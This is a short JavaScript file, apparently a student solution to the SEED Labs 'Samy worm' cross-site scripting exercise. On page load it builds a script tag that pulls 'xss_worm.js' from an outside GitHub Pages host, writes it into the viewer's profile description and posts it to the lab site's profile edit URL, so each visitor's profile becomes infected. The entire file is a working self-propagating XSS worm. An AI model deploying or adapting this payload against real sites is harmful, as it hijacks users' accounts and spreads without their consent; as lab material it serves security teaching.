window.onload = function() {
    // Define the worm code to be injected into the victim's profile
    var wormCode = encodeURIComponent(
        "<script type=\"text/javascript\" " +
        "id=\"worm\" " +
        "src=\"https://n1ck-n4m3.github.io/js/xss_worm.js\">" + 
        "</" + "script>"
    );

    // Construct the description field with the worm code
    var desc = "&description=Samy is my hero " + wormCode;
    desc += "&accesslevel[description]=2";  // Set the access level of the description field

    // Fixed URL to modify the profile (you can replace 'alice' with any user's profile edit URL)
    var sendurl = "http://www.seed-server.com/action/profile/edit"; 

    // Create and send the Ajax POST request to modify the victim's profile
    var Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(desc); 

    // Optional: Console log for debugging
    console.log("Worm successfully injected and profile updated.");
};
